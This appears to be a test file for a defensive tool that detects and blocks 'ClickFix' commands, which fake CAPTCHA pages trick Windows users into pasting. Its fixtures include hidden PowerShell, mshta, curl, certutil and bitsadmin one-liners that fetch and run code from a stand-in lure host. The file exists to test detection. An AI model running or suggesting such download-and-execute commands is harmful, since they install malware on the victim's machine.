'use strict';
/**
 * The ClickFix shield: which copied text is a command a fake "I am not a robot" page wants pasted into Windows,
 * what is done about it, and that the Windows app and the companion use the very same rules.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const ROOT = path.join(__dirname, '..');
const read = (p) => fs.readFileSync(path.join(ROOT, p), 'utf8').replace(/\r\n/g, '\n');
const { classify, decide } = require('../server/lib/scan/clickfix');

// The app requires its copy in desktop/shared; make it if this file runs first.
{
  const to = path.join(ROOT, 'desktop', 'shared', 'clickfix.js');
  fs.mkdirSync(path.dirname(to), { recursive: true });
  let same = false;
  try { same = fs.readFileSync(to).equals(fs.readFileSync(path.join(ROOT, 'server', 'lib', 'scan', 'clickfix.js'))); } catch { /* not there yet */ }
  if (!same) fs.copyFileSync(path.join(ROOT, 'server', 'lib', 'scan', 'clickfix.js'), to);
}

test('commands only a trick would copy are strong', () => {
  for (const t of [
    'powershell -w hidden -c "iwr http://lure.test/a.ps1 | iex"',
    'powershell.exe -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
    'mshta https://lure.test/check.hta',
    'cmd /c start /min powershell -w h -c "irm lure.test/x | iex"',
    'conhost --headless powershell -c "irm lure.test | iex"',
    '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -w 1 -c "irm lure.test|iex"',
    'cmd /c curl -s lure.test/a | cmd # I am not a robot - reCAPTCHA Verification ID: 4821',
    'powershell -c "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\'aWV4\')))"',
    `cmd /c ping lure.test${' '.repeat(60)}Cloudflare check`
  ]) {
    const found = classify(t);
    assert.equal(found && found.level, 'strong', t);
    assert.equal(decide(found, null), 'stop', `${t}: stopped even on a clear page`);
  }
});

test('downloading and running is medium: stopped only when the page is not clear', () => {
  for (const t of [
    'irm https://get.scoop.sh | iex',
    'iex (irm https://installer.test/install.ps1)',
    'powershell -c "irm https://installer.test/install.ps1 | iex"',
    'certutil -urlcache -split -f http://files.test/a.exe a.exe',
    'bitsadmin /transfer job http://files.test/a.exe %temp%\\a.exe'
  ]) {
    const found = classify(t);
    assert.equal(found && found.level, 'medium', t);
    assert.equal(decide(found, undefined), 'tell', `${t}: page not known, only told`);
    assert.equal(decide(found, null), 'tell', `${t}: clear page, only told`);
    assert.equal(decide(found, 'yellow'), 'stop', `${t}: suspicious page, stopped`);
  }
});

test('everyday copied text and ordinary commands are left alone', () => {
  for (const t of [
    '', 'hello world', 'https://example.com/a?b=c', 'npm install sentinel', 'winget install Git.Git',
    'git clone https://github.com/x/y.git', 'Get-ChildItem -Recurse', 'powershell Get-Process', 'cmd /c dir',
    'Attackers run powershell -w hidden -enc AAAAAAAAAAAAAAAAAAAAAAAA to hide their tracks.',
    'The ClickFix lure says: press Windows + R and paste mshta https://lure.test',
    `powershell -w hidden ${'x'.repeat(5000)}`
  ]) {
    assert.equal(classify(t), null, t.slice(0, 80));
    assert.equal(decide(classify(t), 'red'), null);
  }
});

test('developer snippets are not stopped, real fake-check commands still are', () => {
  for (const t of [
    '$ df -h  # human-readable',
    'curl -LO https://downloads.test/tool.tar.gz  # then verify the checksum',
    [
      "$url = 'https://downloads.test/tool-1.2.zip'",
      "$out = Join-Path $env:TEMP 'tool.zip'",
      'Invoke-WebRequest $url -OutFile $out',
      '# Verify the hash before you run anything',
      'Get-FileHash $out -Algorithm SHA256'
    ].join('\n'),
    '\n\n$ ls -la  # list everything, human sizes'
  ]) {
    const found = classify(t);
    assert.ok(!found || found.level !== 'strong', `${t.slice(0, 60)}: not strong`);
    assert.notEqual(decide(found, null), 'stop', `${t.slice(0, 60)}: not stopped on a clear page`);
  }
  for (const t of [
    'powershell -w hidden -enc ' + Buffer.from('Write-Output hi', 'utf16le').toString('base64'),
    'mshta https://lure.test/verify.hta',
    'cmd /c start /min powershell iwr lure.test/x | iex # I am not a robot - reCAPTCHA Verification ID: 1234',
    'powershell -c "irm lure.test | iex" # Verification code: 77310',
    '$ powershell -w hidden -c "irm lure.test | iex"'
  ]) {
    const found = classify(t);
    assert.equal(found && found.level, 'strong', t);
    assert.equal(decide(found, null), 'stop', t);
  }
});

test('the app stops a command copied in a browser, only tells about one copied in another program, and "Put it back" never overwrites a newer copy', async () => {
  const Module = require('module');
  let board = 'copied before Sentinel started';
  const fake = { clipboard: { readText: async () => board, writeText: async (t) => { board = t; } } };
  const load = Module._load;
  Module._load = function (req, ...rest) { return req === 'electron' ? fake : load.call(this, req, ...rest); };
  const file = require.resolve('../desktop/src/clipwatch.js');
  delete require.cache[file];
  const cw = require(file);
  try {
    let front = null;
    const events = [];
    cw.start({ links: () => false, commands: () => true, browserOpen: () => true, browserInFront: () => front, page: () => ({ host: 'lure.test', badge: null }), onCommand: (c) => events.push(c), log: () => {} });
    await new Promise((r) => setImmediate(r));
    const cmd = (n) => `powershell -w hidden -enc ${Buffer.from(`Write-Output ${n}`, 'utf16le').toString('base64')}`;

    // Copied in a terminal while a browser runs behind it: told, clipboard left alone, read slowly.
    board = cmd(1); await cw._test.tick();
    assert.equal(board, cmd(1));
    assert.deepEqual([events[0].action, events[0].from, events[0].host], ['tell', 'program', null]);
    assert.equal(cw.status().every, 1500);

    // Copied with the browser in front: stopped, held for "Put it back", read every half second.
    front = 'edge';
    board = cmd(2); await cw._test.tick();
    assert.match(board, /^Sentinel stopped a command copied from lure\.test/);
    assert.deepEqual([events[1].action, events[1].from], ['stop', 'browser']);
    assert.equal(cw.heldCommand().host, 'lure.test');
    assert.equal(cw.heldCommand().text, undefined, 'the command\'s text never leaves the module');
    assert.equal(cw.status().every, 500);

    // Something else copied since: "Put it back" leaves it, says why, and the command is let through next time.
    board = 'a newer copy'; await cw._test.tick();
    assert.deepEqual(await cw.putBack(), { ok: false, why: 'newer' });
    assert.equal(board, 'a newer copy');
    assert.equal(cw.heldCommand(), null);
    board = cmd(2); await cw._test.tick();
    assert.equal(board, cmd(2), 'copied again after asking for it back: left alone');

    // The usual case: put back straight away.
    board = cmd(3); await cw._test.tick();
    assert.deepEqual(await cw.putBack(), { ok: true });
    assert.equal(board, cmd(3));
    assert.deepEqual(await cw.putBack(), { ok: false, why: 'gone' }, 'nothing held any more');
  } finally {
    cw.stop();
    Module._load = load;
  }
});

test('the Windows app and the companion carry the same rules', () => {
  assert.equal(read('extension/src/content/clickfix.js'), read('server/lib/scan/clickfix.js'), 'scripts/build-extension.js copies it; commit the copy');
  assert.match(read('desktop/scripts/sync-shared.js'), /'clickfix\.js'/);
  // The companion's guard is registered by its worker while "Stop pasted commands" is on, not listed in the manifest.
  const manifest = JSON.parse(read('extension/manifest.json'));
  assert.ok(!manifest.content_scripts.some((c) => c.js.includes('src/content/clipguard.js')), 'registered by the worker, so the switch can turn it off');
  assert.ok(manifest.permissions.includes('scripting'));
  const bg = read('extension/src/background.js');
  const reg = bg.slice(bg.indexOf('const CLIPGUARD = {'), bg.indexOf('};', bg.indexOf('const CLIPGUARD = {')));
  assert.match(reg, /js: \['src\/content\/clickfix\.js', 'src\/content\/alarm\.page\.js', 'src\/content\/clipguard\.js'\]/, 'the rules and the warning load first');
  assert.equal(read('extension/src/content/alarm.page.js'), read('extension/src/content/alarm.js'), 'scripts/build-extension.js copies it; commit the copy');
  assert.match(reg, /world: 'MAIN'/, "it must wrap the page's own clipboard calls");
  assert.match(reg, /runAt: 'document_start'/, "before the page's scripts");
  assert.match(read('extension/src/lib/api.js'), /commandGuard: true/, 'on unless the person turns it off');
  assert.match(read('extension/src/options.html'), /id="commandGuard"/);
});

/** The companion's guard in a page of its own: the clipboard calls it wraps, and what it shows. */
function page() {
  const shown = [];
  const clipboard = { text: '', writeText(t) { this.text = t; return Promise.resolve(); }, write(items) { return items[0].getType('text/plain').then((b) => b.text()).then((t) => { this.text = t; }); } };
  const listeners = {};
  class Document { execCommand(cmd) { if (cmd === 'copy') listeners.copy(this.nextCopy); return true; } }
  const ctx = {
    navigator: { clipboard }, Document, DOMException, Promise, String, RegExp,
    SentinelAlarm: { show: (o) => { shown.push(o); return { close() {} }; }, leave() {} },
    addEventListener: (type, fn) => { listeners[type] = fn; },
    getSelection: () => ctx.selection,
    document: { activeElement: null },
    selection: ''
  };
  ctx.globalThis = ctx;
  require('vm').createContext(ctx);
  require('vm').runInContext(read('extension/src/content/clickfix.js'), ctx);
  require('vm').runInContext(read('extension/src/content/clipguard.js'), ctx);
  const copy = (text, isTrusted, scripted) => {
    ctx.selection = text;
    const ev = { isTrusted, prevented: false, preventDefault() { this.prevented = true; } };
    if (scripted) ctx.Document.prototype.execCommand.call({ nextCopy: ev }, 'copy'); else listeners.copy(ev);
    return ev.prevented;
  };
  return { ctx, clipboard, shown, copy };
}

const LURE = 'powershell -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA=';

test('companion: a page cannot copy a strong command, and is told the write was not allowed', async () => {
  const p = page();
  await p.ctx.navigator.clipboard.writeText('npm i x');
  assert.equal(p.clipboard.text, 'npm i x');
  await assert.rejects(p.ctx.navigator.clipboard.writeText(LURE), (err) => err.name === 'NotAllowedError');
  assert.equal(p.clipboard.text, 'npm i x', 'not copied');
  assert.equal(p.shown.length, 1);
  assert.match(p.shown[0].title, /stopped this page from copying a command/);
  assert.equal(typeof p.shown[0].escape, 'function', 'Escape closes it');

  const item = (t) => ({ types: ['text/plain'], getType: async () => ({ text: async () => t }) });
  await assert.rejects(p.ctx.navigator.clipboard.write([item(LURE)]), (err) => err.name === 'NotAllowedError', 'clipboard.write is wrapped too');
  assert.equal(p.clipboard.text, 'npm i x');
  await p.ctx.navigator.clipboard.write([item('echo hi')]);
  assert.equal(p.clipboard.text, 'echo hi');
});

test("companion: the person's own copy gets the small notice; a script's copy gets the full warning", () => {
  const p = page();
  assert.equal(p.copy('just some text', true), false);
  assert.equal(p.copy(LURE, true), true, 'held back');
  assert.equal(p.shown.at(-1).small, true);
  assert.ok(p.shown.at(-1).buttons.some((b) => /Copy it anyway/.test(b.text)));
  assert.equal(p.copy(LURE, false), true);
  assert.notEqual(p.shown.at(-1).small, true, 'an untrusted copy event is a script');
  assert.equal(p.copy(LURE, true, true), true);
  assert.notEqual(p.shown.at(-1).small, true, "execCommand('copy') from a script fires a trusted event, and is still the page's");
});

test('the app swaps a stopped command for a harmless line, and never logs or sends copied text', () => {
  const { stoppedLine } = require('../desktop/src/clipwatch.js')._test;
  const line = stoppedLine('lure.test');
  assert.match(line, /lure\.test/);
  assert.equal(classify(line), null, 'the replacement is not itself a command');
  assert.doesNotMatch(line + stoppedLine(null), /\u2014/, 'no em dashes');
  const src = read('desktop/src/clipwatch.js');
  assert.doesNotMatch(src, /log\(`[^`]*\$\{text\}/, 'the log never holds the copied text');
  assert.doesNotMatch(src.slice(src.indexOf('function shield'), src.indexOf('function putBack')), /opts\.api\(/, 'a command is judged here, never sent');
  const main = read('desktop/src/main.js');
  assert.match(main, /store\.get\('commandShield', true\)/, 'on unless the person turns it off');
  assert.match(main, /store\.get\('clipboardCheck', false\)/, 'copied links stay off until turned on');
});
